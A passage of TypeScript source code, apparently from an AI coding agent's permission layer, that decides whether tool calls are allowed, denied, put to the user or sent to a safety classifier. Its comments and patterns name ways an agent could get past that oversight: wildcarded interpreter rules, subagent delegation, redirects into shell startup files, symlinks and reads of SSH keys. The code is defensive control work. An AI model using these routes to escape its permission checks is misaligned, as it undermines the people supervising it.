	 * resolved. A read inside one is a working-space read, and acceptEdits may
	 * write inside one, as in Claude Code; a credential path inside one is not
	 * working space. Auto mode's unclassified writes stay confined to the working
	 * directory (the classifier's containment fast path never sees these).
	 */
	workspaceDirs?: string[];
}

export interface Decision {
	decision: PermissionDecision;
	/** Rule that determined the outcome, when one did. */
	rule?: PermissionRule;
	/** Why, for deny/ask decisions surfaced to the model or user. */
	cause:
		| "rule"
		| "plan-mode"
		| "plan-file"
		| "plan-readonly"
		| "memory-dir"
		| "scratchpad-dir"
		| "mode"
		| "tier"
		| "protected-path"
		/** A read, or an acceptEdits write, whose path is outside the working directory. */
		| "working-dir";
}

/**
 * Custom-tier tools that only read (the network or MCP resources) and so stay
 * available in plan mode, as WebFetch/WebSearch do in Claude Code. Everything
 * else custom is treated as a mutation there.
 */
const PLAN_READ_ONLY_TOOLS = new Set(["web_fetch", "web_search", "list_mcp_resources", "read_mcp_resource", "read_mcp_resource_dir"]);

/**
 * Tools that launch a fresh agent loop. In auto mode these are classified
 * rather than auto-allowed, so the delegated task is judged before the child
 * starts — a child cannot be trusted to refuse a task its parent should not have
 * handed it, and Claude Code evaluates the task description at spawn time for
 * the same reason. Outside auto mode they stay auto-allowed: each child enforces
 * its own permissions by inheriting the mode. `SendMessage` is a delegation
 * too: a new task handed to a resident agent after its spawn was judged is a
 * new delegation, and until 2026-09-05 it was never classified
 * (PERMISSIONS-REVIEW-2026-09-05 L4).
 */
const DELEGATION_TOOLS = new Set(["Agent", "workflow", "SendMessage"]);

/**
 * Allowed in every mode but auto, where the classifier reviews them: Claude
 * Code's `CronCreate` and `ScheduleWakeup` (findings §21: "Scheduling a cron
 * prompt requires classifier review", "Scheduling a /loop wakeup requires
 * classifier review"). A scheduled prompt replays later with nobody watching,
 * so the classifier judges what it asks for. Unlike DELEGATION_TOOLS, an allow
 * rule for one still applies in auto mode.
 */
const CLASSIFY_IN_AUTO_TOOLS = new Set(["cron_create", "schedule_wakeup"]);

/**
 * Interpreters and runners whose arguments are code, so a wildcarded rule over
 * them (`Bash(python*)`, `Bash(npm run *)`) grants arbitrary execution just as
 * surely as `Bash(*)` does.
 */
const INTERPRETERS_AND_RUNNERS =
	/^(python[0-9.]*|python3|node|deno|bun|ruby|perl|php|osascript|bash|sh|zsh|fish|pwsh|powershell|cmd|wsl|eval|exec|env|xargs|nohup|setsid|timeout|make|npx|pnpx|yarn|npm|pnpm|bunx|uv|uvx|pip[0-9]*|poetry|cargo|go|dotnet|java|mvn|gradle|docker|kubectl|ssh|invoke-expression|invoke-command|start-process|start-job)\b/;

/**
 * An allow rule broad enough to grant arbitrary code execution. Auto mode
 * suspends these — a blanket `Bash` or a wildcarded interpreter would otherwise
 * hand the model a standing way past the classifier, which is the one thing auto
 * mode exists to prevent. Narrow rules (`Bash(npm test:*)`) still resolve before
 * the classifier unless `classifyAllShell` is set.
 *
 * Matches Claude Code's list: blanket `Bash(*)`/`PowerShell(*)`, wildcarded
 * interpreters, package-manager run commands, and `Agent`/`Task` rules.
 */
export function isBroadExecutionRule(rule: PermissionRule): boolean {
	// Delegation rules are dropped outright: a subagent is a fresh agent loop, so
	// pre-approving one pre-approves whatever that loop decides to do.
	if (DELEGATION_TOOLS.has(rule.tool)) return true;
	if (!isShellToolName(rule.tool)) return false;

	if (!rule.pattern) return true;
	const pattern = rule.pattern.trim().toLowerCase();
	// Without a wildcard the rule matches one exact command, which is narrow by
	// construction however powerful that command is — `Bash(python)` only ever
	// starts a bare REPL.
	if (!hasUnescapedWildcard(pattern)) return false;
	if (/^(\*|:\*|\*\*)$/.test(pattern)) return true;

	const rawHead = pattern.split(/[\s*]/)[0] ?? "";
	// A PowerShell alias is as broad as its cmdlet: `PowerShell(iex *)` is
	// `Invoke-Expression *`, `PowerShell(saps *)` is `Start-Process *`.
	const head = rule.tool === "powershell" ? canonicalCommandName(rawHead).toLowerCase() : rawHead;
	if (!INTERPRETERS_AND_RUNNERS.test(head)) return false;

	const rest = pattern.slice(rawHead.length).trim();
	// Nothing constrains the arguments: `python*`, `node *`, `npm *`.
	if (/^[:\s]*\*+$/.test(rest)) return true;
	// The runner's own escape hatch takes arbitrary code: `npm run *`, `npx *`.
	if (/^(run|exec|x)[:\s]*\*+$/.test(rest)) return true;
	// Interpreter inline-code flags take arbitrary code: `python -c *`, `node -e *`,
	// `sh -c *`, `bash -c *`, `ruby -e *`. Quote-wrapped spellings count too —
	// `python3 -c '*` / `-c ' *` (as real settings write them) hand over exactly
	// the same arbitrary code slot. Without this, such a rule granted a standing
	// bypass of the classifier (over-flagging a runner's `-c` here only costs a
	// classifier call, which is the safe direction).
	if (/^-(c|e)[\s:='"]*\*+['"]*$/.test(rest)) return true;
	// `npm test:*` names the script, so it stays narrow.
	return false;
}

export function decide(params: DecideInput): Decision {
	const { toolName, subject, cwd, mode, deny, ask, allow } = params;
	/**
	 * The harness's readable session dirs and the workspace directories,
	 * realpath'd, as the auto-mode pre-gate sees them (permissions/index.ts
	 * `readableRoots`).
	 */
	const sessionReadableRoots = () => [
		...[params.memoryDirPath, params.scratchpadDirPath, params.resultsDirPath, params.sessionDirPath].filter((d): d is string => !!d).map((d) => resolveForContainment(d) ?? d),
		...(params.workspaceDirs ?? []),
	];
	/** The pre-gate's proof that a command only reads inside the project, for a substitution in an allowed command. */
	const readOnlyShell = (command: string): boolean => {
		const evidence = analyzeShellCommand({ command, cwd, home: homedir(), protectedDirs: params.protectedDirs, readableRoots: sessionReadableRoots() });
		return evidence.verdict === "safe" && evidence.writes.length === 0;
	};

	// In dontAsk mode anything that would prompt is denied instead — including
	// explicit ask rules: there is no user to put the question to.
	const askOrDeny = (rule?: PermissionRule): Decision => {
		if (mode === "dontAsk") return { decision: "deny", rule, cause: "mode" };
		return { decision: "ask", rule, cause: rule ? "rule" : "tier" };
	};

	const denyRule = deny.find((r) => ruleMatches(r, toolName, subject, cwd));
	if (denyRule) return { decision: "deny", rule: denyRule, cause: "rule" };

	if (mode === "bypassPermissions") return { decision: "allow", cause: "mode" };

	const tier = toolTier(toolName);
	const tool = normalizeToolName(toolName);
	if (mode === "plan" && tier !== "safe" && !AUTO_ALLOWED_TOOLS.has(normalizeToolName(toolName))) {
		// Plan mode's one writable file (~/.onecode/plans/<slug>.md, which
		// protected-paths already excepts as working space).
		const planFile = params.planFilePath;
		if (planFile && isWritingTool(normalizeToolName(toolName)) && subject) {
			const planTarget =
				isPlanFilePath(subject, planFile, cwd) ||
				(params.resolvedSubject ? isPlanFilePath(params.resolvedSubject, planFile, cwd) : false);
			if (planTarget) return { decision: "allow", cause: "plan-file" };
		}
		// Read-only bash stays usable while planning (Claude Code permits it). The
		// auto-mode shell pre-gate's "safe" verdict means "every command is on the
		// read-only allowlist, nothing leaves the project" — plus in-project
		// redirect writes, which it records; a safe verdict with no writes is
		// exactly read-only. Anything it cannot vouch for is denied as before.
		// Without this the frontier tier (no grep/find/ls) was left with `read` alone.
		// The harness's readable session dirs, as the auto-mode pre-gate sees them
		// (permissions/index.ts `readableRoots`): a plan-mode read of this project's
		// transcripts is a read like any other.
		const readableRoots = sessionReadableRoots();
		if (tool === "bash" && subject) {
			const evidence = analyzeShellCommand({ command: subject, cwd, home: homedir(), protectedDirs: params.protectedDirs, readableRoots });
			if (evidence.verdict === "safe" && evidence.writes.length === 0) return { decision: "allow", cause: "plan-readonly" };
			// Read-only, but of a path outside the working directory: still a read,
			// so it is put to the user rather than refused as a plan-mode mutation
			// (the read tools ask for the same path below).
			if (evidence.readOnlyOutside && evidence.writes.length === 0) return { decision: "ask", cause: "working-dir" };
		}
		// The PowerShell counterpart: Claude Code's read-only cmdlet allowlist,
		// with in-project paths by shape (powershell-rules.ts).
		if (tool === "powershell" && subject && powershellReadOnly(subject, { cwd, home: homedir(), readableRoots }).readOnly) return { decision: "allow", cause: "plan-readonly" };
		if (PLAN_READ_ONLY_TOOLS.has(tool)) return { decision: "allow", cause: "plan-readonly" };
		return { decision: "deny", cause: "plan-mode" };
	}

	// An explicit ask rule is the user's stated intent to be prompted, so it wins
	// over auto mode too: the classifier never gets to auto-approve a match.
	const askRule = ask.find((r) => ruleMatches(r, toolName, subject, cwd));
	if (askRule) return askOrDeny(askRule);

	/**
	 * The session's own auto-memory and scratchpad directories are
	 * harness-designated working space, like plan mode's plan file: the system
	 * prompt instructs the model to write memories and temp files there, so
	 * gating those writes (outside-cwd, and for memory under the protected
	 * `.claude` dir) makes the harness block its own feature — auto mode's
	 * classifier was correctly flagging them as out-of-project writes. This
	 * clears *only* the exact per-session dirs passed in; any other path under
	 * `.claude` or `/tmp` gets no special treatment. The resolved form is
	 * where the write actually lands, so it is the one judged — a symlink
	 * planted inside a session dir must not turn this into an allow for
	 * wherever it points.
	 */
	if (isWritingTool(normalizeToolName(toolName)) && subject) {
		const target = params.resolvedSubject ?? subject;
		for (const { dir, cause } of [
			{ dir: params.memoryDirPath, cause: "memory-dir" as const },
			{ dir: params.scratchpadDirPath, cause: "scratchpad-dir" as const },
		]) {
			if (dir && isInsideDir(target, dir, cwd)) return { decision: "allow", cause };
		}
		// The plan file lives under the state dir (`~/.onecode/plans`), which the
		// runtime protects; clear it here, before the protected check, since it is
		// harness working space the model is told to write (review L2).
		if (params.planFilePath && isPlanFilePath(target, params.planFilePath, cwd)) return { decision: "allow", cause: "plan-file" };
	}

	// Protected-path writes are checked *before* allow rules, so an
	// `Edit(.claude/**)` entry cannot pre-approve reconfiguring the agent's own
	// permissions or planting a git hook. In auto mode they go to the classifier.
	const isProtected = (...candidates: (string | undefined)[]) =>
		candidates.some(
			(candidate) =>
				candidate &&
				(isProtectedPath(candidate, cwd) || (params.protectedDirs ?? []).some((dir) => isInsideDir(candidate, dir, cwd))),
		);
	if (isWritingTool(tool) && subject && isProtected(subject, params.resolvedSubject)) {
		if (mode === "dontAsk") return { decision: "deny", cause: "protected-path" };
		if (mode === "auto") return { decision: "classify", cause: "protected-path" };
		return { decision: "ask", cause: "protected-path" };
	}

	/**
	 * Whether `target` (where `spelled` resolves) is working space: the working
	 * directory, the harness's session dirs, the plan file, and the workspace
	 * directories except for the credentials in them.
	 */
	const workingSpaceHolds = (spelled: string, target: string, workspace = true): boolean => {
		const roots = [cwd, params.resolvedCwd, params.memoryDirPath, params.scratchpadDirPath, params.resultsDirPath, params.sessionDirPath];
		if (roots.some((dir) => dir && isAtOrInsideDir(target, dir, cwd))) return true;
		// A workspace directory is working space except for the credentials in it:
		// adding a directory must not make its keys readable without a prompt.
		// Judged on the spelling and on where it resolves, so a symlink cannot
		// launder a credential in either direction.
		const sensitive = [spelled, target].some((candidate) => isSensitivePath(toAbsolute(cwd, candidate, homedir())));
		if (workspace && !sensitive && (params.workspaceDirs ?? []).some((dir) => isAtOrInsideDir(target, dir, cwd))) return true;
		return params.planFilePath ? isPlanFilePath(target, params.planFilePath, cwd) : false;
	};
	const outsideWorkingDir = (): Decision => {
		if (mode === "auto") return { decision: "classify", cause: "working-dir" };
		if (mode === "dontAsk") return { decision: "deny", cause: "working-dir" };
		return { decision: "ask", cause: "working-dir" };
	};

	/**
	 * Whether a redirect on the line reads or writes outside the working space,
	 * onto a protected path, or somewhere only known at runtime (an expansion,
	 * a glob, `~user`, or a relative target after a `cd`).
	 */
	const redirectEscapes = (command: string): boolean => {
		const { segments, parseFailed } = parseCommand(command.trim());
		// A line that did not parse may hide a redirect the segments dropped.
		if (parseFailed) return /[<>]/.test(command);
		const home = homedir();
		// Only a `cd` before a redirect moves where its relative target lands.
		let moved = false;
		for (const segment of segments) {
			if (movesDirectory(segment)) moved = true;
			const targets = [...segment.redirects.map((value) => ({ value, write: true })), ...segment.inputs.map((token) => ({ value: token.value, write: false }))];
			if (targets.length > 0 && segment.unknownTarget) return true;
			for (const { value: target, write } of targets) {
				if (DEVICE_TARGETS.has(target) || target.startsWith("/dev/fd/")) continue;
				if (isUnknownTilde(target) || /[*?[]/.test(target)) return true;
				if (moved && !isAbsolute(target) && !target.startsWith("~")) return true;
				const absolute = toAbsoluteBash(cwd, target, home);
				const resolved = resolveForContainment(absolute) ?? absolute;
				// Auto mode's unclassified writes stay in the working directory, a
				// workspace directory's included (decisions/modes.md).
				if (!workingSpaceHolds(target, resolved, !(write && mode === "auto"))) return true;
				if (isProtected(absolute, resolved)) return true;
			}
		}
		return false;
	};

	const usableAllow =
		mode === "auto"
			? allow.filter((rule) => {
					if (isBroadExecutionRule(rule)) return false;
					if (params.classifyAllShell && isShellTool(rule.tool)) return false;
					return true;
				})
			: allow;
	// Command allow rules (bash, monitor) must cover EVERY subcommand of a
	// compound line (CC semantics); a deny/ask rule above fired on ANY subcommand.
	const allowRule =
		subjectKind(tool) === "command"
			? subject
				? findBashAllowRule(usableAllow, subject, tool, { readOnly: readOnlyShell })
				: undefined
			: usableAllow.find((r) => ruleMatches(r, toolName, subject, cwd));
	if (allowRule) {
		// Claude Code's path constraints, checked before any allow rule: a rule
		// for the command never covers a redirect outside the working space
		// (`Bash(echo:*)` and `echo … >> ~/.zshrc`), or onto a protected path.
		if (subjectKind(tool) === "command" && subject && normalizeToolName(tool) !== "powershell" && redirectEscapes(subject)) return outsideWorkingDir();
		return { decision: "allow", rule: allowRule, cause: "rule" };
	}

	if (mode === "auto" && (DELEGATION_TOOLS.has(tool) || CLASSIFY_IN_AUTO_TOOLS.has(tool))) {
		return { decision: "classify", cause: "mode" };
	}

	/**
	 * Working-directory containment — Claude Code's `pathInAllowedWorkingPath`
	 * (filesystem.ts): the read tier is allowed inside the working directory and
	 * asks outside it, and acceptEdits approves edits inside it only. The
	 * harness's own session dirs (auto-memory, scratchpad, persisted tool
	 * results, the plan file) count as inside — the system prompt tells the
	 * model to read and write there. The resolved subject is judged where the
	 * caller resolved one, so a symlink inside the project that points out of
	 * it is outside. Until 2026-09-05 neither check existed: `read ~/.ssh/id_rsa`
	 * was allowed in every mode including auto and plan, and acceptEdits wrote
	 * anywhere on disk (PERMISSIONS-REVIEW-2026-09-05 H1, H2).
	 */
	const inWorkingSpace = (): boolean => workingSpaceHolds(subject, params.resolvedSubject ?? subject);
	if (tier === "safe") {
		// No path argument (grep/find/ls default to the cwd) is an in-project read.
		if (!subject || inWorkingSpace()) return { decision: "allow", cause: "tier" };
		return outsideWorkingDir();
	}
	if (AUTO_ALLOWED_TOOLS.has(tool)) return { decision: "allow", cause: "tier" };
	if (tier === "edit" && mode === "acceptEdits") {
		if (subject && inWorkingSpace()) return { decision: "allow", cause: "mode" };
		return outsideWorkingDir();
	}

	// Everything left over goes to the classifier in auto mode, and to the user
	// in every other mode.
	if (mode === "auto") return { decision: "classify", cause: "mode" };

	return askOrDeny();
}
